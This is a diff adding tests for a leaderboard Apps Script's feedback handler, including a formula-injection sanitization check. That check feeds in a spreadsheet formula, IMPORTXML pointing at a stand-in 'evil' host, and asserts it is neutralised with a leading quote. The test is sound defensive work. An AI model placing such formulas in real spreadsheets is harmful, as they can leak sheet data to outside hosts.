@@ -71,3 +71,56 @@ assert.notStrictEqual(mathNames.cacheKey, flagsDefault.cacheKey);
 assert.notStrictEqual(mathNames.cacheKey, capitals.cacheKey);
 
 console.log("All leaderboard-apps-script tests passed");
+
+// --- feedback branch ---
+
+global.ContentService = {
+  MimeType: { JSON: "JSON" },
+  createTextOutput(text) {
+    return { text, setMimeType() { return this; } };
+  },
+};
+
+const feedbackRows = [["Timestamp", "Game", "Rating", "Text", "Name"]];
+global.SpreadsheetApp = {
+  getActiveSpreadsheet() {
+    return {
+      getSheetByName(name) {
+        return name === "Feedback" ? { appendRow: row => feedbackRows.push(row) } : null;
+      },
+      insertSheet() {
+        throw new Error("insertSheet should not be needed — Feedback sheet stub already exists");
+      },
+    };
+  },
+};
+
+const { doPost } = require("./leaderboard-apps-script.js");
+const feedbackResult = doPost({
+  postData: {
+    contents: JSON.stringify({ type: "feedback", game: "capitals", rating: 5, text: "Great game!", name: "Alice" }),
+  },
+});
+assert.strictEqual(feedbackRows.length, 2);
+assert.strictEqual(feedbackRows[1][1], "capitals");
+assert.strictEqual(feedbackRows[1][2], 5);
+assert.strictEqual(feedbackRows[1][3], "Great game!");
+assert.strictEqual(feedbackRows[1][4], "Alice");
+assert.deepStrictEqual(JSON.parse(feedbackResult.text), { ok: true });
+
+console.log("All feedback tests passed");
+
+// --- feedback branch: formula-injection sanitization ---
+
+const injectionText = '=IMPORTXML("http://evil", "//a")';
+const injectionResult = doPost({
+  postData: {
+    contents: JSON.stringify({ type: "feedback", game: "capitals", rating: 5, text: injectionText, name: "Alice" }),
+  },
+});
+assert.strictEqual(feedbackRows.length, 3);
+assert.ok(feedbackRows[2][3].startsWith("'="), "formula-triggering text should be prefixed with a leading quote");
+assert.strictEqual(feedbackRows[2][3], "'" + injectionText);
+assert.deepStrictEqual(JSON.parse(injectionResult.text), { ok: true });
+
+console.log("All formula-injection sanitization tests passed");
